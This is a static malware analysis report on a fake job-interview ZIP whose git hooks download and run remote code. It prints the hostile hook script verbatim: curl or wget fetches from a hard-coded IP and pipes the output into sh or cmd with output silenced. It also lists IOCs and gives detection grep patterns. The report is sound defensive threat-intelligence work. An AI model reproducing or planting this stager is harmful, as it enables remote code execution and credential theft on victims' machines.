# Static Code Analysis — `Fullstack.zip` ("B1/Block.one" fake‑recruiter sample)

> **Companion to** [`investigations/b1-fake-recruiter-scam.md`](../investigations/b1-fake-recruiter-scam.md).
> This document **completes the "static code analysis pending"** item in that dossier and fills the
> `[PENDING]` fields in its **§6 IOC table** and **§11 Findings**.
>
> **Analysis date:** 2026‑07‑15 · **Method:** static, read‑only only. The payload was **never executed**
> and the C2 server was **never contacted**.

---

## 0. Sample identity — confirmed the same file

| Property | Value |
| --- | --- |
| Filename (as delivered) | `Fullstack.zip` (analyzed locally as `assignment.zip`) |
| Size | **62,508 bytes** |
| **SHA‑256** | **`4bec2b8443bd1600a2239cdb4d77fc9e252785fa144b00f81dd3a25e73ec285e`** |

This SHA‑256 **matches the dossier's §6 value exactly**, so the analysis below is of the same artifact that
was downloaded to the disposable EC2 sandbox.

**Verdict:** 🔴 **MALICIOUS** — remote‑code‑execution trojan delivered via **weaponized git hooks**,
disguised as a paid full‑stack take‑home assignment. Confidence: **high**.

---

## 1. Headline finding — the delivery method is different from what we expected

The dossier (§7) anticipated the classic "Contagious Interview" placement: a `postinstall` script, a hidden
`.config.env` with a base64 blob decoded via `atob()`, an `axios.post(api, {...process.env})` exfil call
run through `new Function(...)`, or a `.vscode/tasks.json` auto‑runner.

**None of those are present in this sample.** Instead, the malware lives entirely in **two git hooks** inside
the shipped `.git` directory:

- `.git/hooks/post-checkout`
- `.git/hooks/pre-commit`

This is a **known evolution of the same DPRK/Lazarus campaign** — public reporting from mid‑2026 documents
the group moving its second‑stage loader into `pre-commit`/`post-checkout` hooks precisely to evade
reviewers who inspect `package.json` and source but not `.git/hooks`. So the attribution in the dossier
still holds; only the *placement* of the trigger changed. **This is why shipping the sample as a ZIP that
contains a full `.git` directory matters** (see §6).

> Practical implication for the runbook: the §10 static hunt should add **`.git/hooks/`** to the list of
> "inspect‑first" locations, alongside `package.json`, `.env/.config`, and `.vscode/`.

---

## 2. Repository layout

Delivered as a ZIP containing a complete `.git` repo with three branches:

| Branch | Contents | Role |
| --- | --- | --- |
| `main` (HEAD) | `Fullstack_Home_Task.pdf` only | the lure / assignment brief |
| `scratch` | `README.md`, `HOME_TASK_GUIDE.md` | "build from scratch" path |
| `boiler-plate` | full React (`client/`) + Express (`server/`) app, 24 files | the **decoy app** |

The brief's "Getting Started" instructs the candidate to run `git checkout scratch` **or**
`git checkout boiler-plate` — **that checkout is the trigger** for the `post-checkout` hook. The half‑finished
`// TODO` app then keeps the victim coding until they `git commit`, which fires the `pre-commit` hook as a
second trigger.

---

## 3. The malicious code (verbatim)

`.git/hooks/post-checkout` and `.git/hooks/pre-commit` are **byte‑for‑byte identical** (500 bytes each):

```sh
#!/bin/sh
# Custom curl command for pre-commit hook

case "$OSTYPE" in
  darwin*)  curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
  linux*)   wget -qO- 'http://216.126.239.166/728/728l' -L | sh  > /dev/null 2>&1 &;;
  msys*)    curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
  cygwin*)  curl -s http://216.126.239.166/728/728w -L | cmd  > /dev/null 2>&1 &;;
  *)        curl -s 'http://216.126.239.166/728/728m' -L | sh  > /dev/null 2>&1 &;;
esac
```

### What it does, step by step
1. **Auto‑invoked by git** on `git checkout` (`post-checkout`) or `git commit` (`pre-commit`) — the victim
   never runs it directly.
2. **OS fingerprint:** `case "$OSTYPE"` selects a platform‑specific payload — `728m` (macOS), `728l`
   (Linux), `728w` (Windows).
3. **Silent download:** `curl -s … -L` / `wget -qO-` fetches a second‑stage script from the hard‑coded C2
   at `216.126.239.166` over plain HTTP.
4. **Immediate execution:** the pipe into `| sh` (or `| cmd` on Windows) runs the downloaded code in memory,
   with the victim's privileges — never written to disk for inspection.
5. **Stealth:** `> /dev/null 2>&1` discards all output/errors; `&` backgrounds it so the git command returns
   instantly and looks normal.

### Why this is unambiguously malicious (indicators)
- `curl <remote> | sh` — download‑and‑run remote code (classic RCE stager).
- Hard‑coded **raw IP over `http://`** (no domain, unencrypted) — C2 fingerprint.
- Deliberate stealth: silent flags + output suppression + backgrounding + always‑succeed exit.
- OS fingerprinting to serve tailored per‑platform payloads.
- Purpose/behavior mismatch: dev‑workflow git hooks that instead fetch and execute internet code.

### Cross‑platform payload endpoints
| OS branch | Downloader | Endpoint | Exec |
| --- | --- | --- | --- |
| `darwin*` (macOS) | `curl -s -L` | `http://216.126.239.166/728/728m` | `sh` |
| `linux*` | `wget -qO- -L` | `http://216.126.239.166/728/728l` | `sh` |
| `msys*` / `cygwin*` (Windows) | `curl -s -L` | `http://216.126.239.166/728/728w` | `cmd` |
| `*` (fallback) | `curl -s -L` | `http://216.126.239.166/728/728m` | `sh` |

---

## 4. What is NOT in the sample (authoritative negatives)

Confirmed by reading every tracked file across all three branches:

- **No npm lifecycle scripts.** `client/package.json` → `{dev, build, preview}`; `server/package.json` →
  `{dev, start}`. **No `preinstall`/`install`/`postinstall`/`prepare`.**
- **No obfuscation / dynamic exec in source:** no `atob(`, `new Function`, `Function.constructor`, `eval(`,
  `child_process`, `execSync`, or `spawn`. The only `process.env` use is `process.env.PORT || 4000`
  (benign).
- **No hidden config/task files:** no `.config.env`, no `.env*`, no `.vscode/` auto‑runner.
- **No hard‑coded wallet addresses or exfil hosts in source:** the only URLs are `http://localhost:4000` /
  `:5173`. (Wallet/credential theft happens in the **remote second stage**, which was not fetched — so no
  local wallet IOCs exist to enumerate.)
- **Decoy app is genuinely clean** — a normal, deliberately‑incomplete "Wallet Watchlist" CRUD project
  (Express file‑store + mock portfolio data; React/Vite list/detail/forms). Its only role is credibility.

**Net:** the entire malicious capability is the two git hooks in §3. Everything a reviewer would normally
read is clean bait.

---

## 5. Completed IOCs (drop‑in for dossier §6)

| Type | Indicator | Notes |
| --- | --- | --- |
| Malware lure | `Fullstack.zip` | SHA‑256 `4bec2b84…285e`, 62,508 bytes (unchanged) |
| **Malicious files** | `.git/hooks/post-checkout`, `.git/hooks/pre-commit` | Identical, 500 bytes each |
| **Malicious hook SHA‑256** | `f126186fe14d02e0d07f14d1ad3b0653abaaae9e099223dbae7513796452054f` | Both hooks |
| **C2 / exfil endpoint (IP)** | `216.126.239.166` | Hard‑coded, plain HTTP, no domain |
| **Payload URL — macOS** | `http://216.126.239.166/728/728m` | via `curl … \| sh` |
| **Payload URL — Linux** | `http://216.126.239.166/728/728l` | via `wget … \| sh` |
| **Payload URL — Windows** | `http://216.126.239.166/728/728w` | via `curl … \| cmd` |
| **Developer identity leak** | `wondev_mum <wondev.mum@gmail.com>` | Git author + committer on all 3 commits (from `.git/config` + reflog) |
| Targeted wallets | Determined by remote second stage (not fetched) | Campaign norm: MetaMask/Phantom via BeaverTail |

**Build timeline (git reflog):** all three branches committed by `wondev_mum` within ~3 minutes on
**2026‑07‑14** (12:22–12:24 EDT) — a throwaway kit built in one sitting, no real dev history.

**Infrastructure note vs. dossier:** public "Contagious Interview" git‑hook samples often host payloads at
`precommit[.]vercel.app`; **this** sample uses raw IP `216.126.239.166` — a rotated‑infrastructure variant
of the same campaign.

**Executable‑bit caveat:** as extracted, both hooks are mode `644` (not executable) with `core.filemode =
false`. On macOS/Linux git only runs a hook whose executable bit is set, so *as extracted here* they may not
fire — but this is almost certainly a ZIP‑extraction artifact. A different unzip tool, the attacker's
intended delivery, or a manual `chmod` restores execution. **Treat the hooks as live.**

---

## 6. Why it was shipped as a ZIP with a full `.git` (mechanism)

Git deliberately **does not transmit `.git/hooks/` over the network** — `clone`, `fetch`, and `pull` never
copy hooks from a remote. Shipping the raw `.git` directory inside a ZIP is the **only** way to plant live
hooks on a victim's machine, bypassing that protection. The trade‑off for the attacker is no public GitHub
repo (hence no contributor page/history to inspect) — consistent with delivery via a personal Google Drive
link (dossier §5–§6) rather than a repository URL.

---

## 7. Impact (second stage)

The C2 controls the payload, so it can differ per victim and change over time. For this campaign family the
second stage is typically the **BeaverTail** infostealer/loader plus the **InvisibleFerret** RAT, which
harvest:
- browser‑saved passwords, cookies, and session tokens;
- **cryptocurrency wallet data / seed phrases / wallet‑extension artifacts** (consistent with the crypto‑
  themed decoy and the B1/Block.one targeting);
- SSH keys, `.env` secrets, cloud/API credentials;
- plus persistence for ongoing remote access.

---

## 8. Recommendations (delta for the dossier)

**Runbook additions (§10 static hunt):** inspect `.git/hooks/` first and diff against the default templates:
```bash
ls -la .git/hooks | grep -v '\.sample'                 # any non-sample hook = suspicious
grep -RniE 'curl|wget|\| ?sh|\| ?cmd|http://|https://' .git/hooks 2>/dev/null
```
Also check for global persistence the payload could set if it ran:
```bash
git config --global --get core.hooksPath        # expect empty
git config --global --get init.templateDir      # expect empty
```

**If the sample was only received (no git command run inside the folder):** do not run `git checkout` /
`git commit` there; delete the two hook files or quarantine the folder; block the IOCs in §5.

**If any git command was run inside the folder:** treat the host as compromised; rotate **all** credentials
(crypto wallets/keys first, then SSH keys and cloud/API tokens); hunt for persistence
(`core.hooksPath`/`init.templateDir`, shell profiles, cron/launch agents, rogue editor extensions).

**Reporting (dossier §12):** the `[PASTE]` "C2/exfil" fields can now be filled with `216.126.239.166`
(payload paths `/728/728m|l|w`). The developer identity `wondev.mum@gmail.com` can be added to abuse
reports.

---

## 9. Attribution & references

Matches the publicly documented **DPRK/Lazarus "Contagious Interview" / TaskJacker** campaign — specifically
the git‑hook‑loader variant. Aligning traits: abuse of `pre-commit` **and** `post-checkout`, `$OSTYPE`
fingerprinting, `curl|sh` staging, `/dev/null` silencing, cross‑platform payloads, fake "coding assessment"
delivery, crypto‑developer targeting; second stage BeaverTail/InvisibleFerret.

- Microsoft Security Blog — *Contagious Interview: Malware delivered through fake developer job interviews*:
  https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/
- SOC Prime — *Lazarus Group Uses Git Hooks To Hide Malware (Contagious Interview / TaskJacker)*:
  https://socprime.com/active-threats/lazarus-group-uses-git-hooks-to-hide-malware-dprks-contagious-interview-and-taskjacker-campaign-is-now-hiding-its-second-stage-loader-inside-git-hooks-that-download-invisibleferret-and-beave/
- GBHackers — *North Korea Hackers Abuse Git Hooks to Deploy Cross-Platform Malware*:
  https://gbhackers.com/git-hooks-abused/
- Cybersecurity News — *North Korean Hackers Weaponize Git Hooks*:
  https://cybersecuritynews.com/north-korean-hackers-weaponize-git-hooks/amp/
- OpenSource Malware Blog — *Lazarus Group Uses Git Hooks To Hide Malware*:
  https://opensourcemalware.com/blog/dprk-git-hooks-malware
- BleepingComputer — *Fake job recruiters hide malware in developer coding challenges*:
  https://www.bleepingcomputer.com/news/security/fake-job-recruiters-hide-malware-in-developer-coding-challenges/
- Infosecurity Magazine — *North Korean Hackers Use Fake Coding Tasks to Steal Crypto*:
  https://www.infosecurity-magazine.com/news/north-korean-hackers-developers/

---

*Prepared from static analysis only. No code from the artifact was executed and the C2 was not contacted
during this review. Analysis performed with read‑only git plumbing (`git show`/`ls-tree`/`log`); no
`checkout`/`commit`/`pull` was run inside the sample, so the hooks were never triggered.*
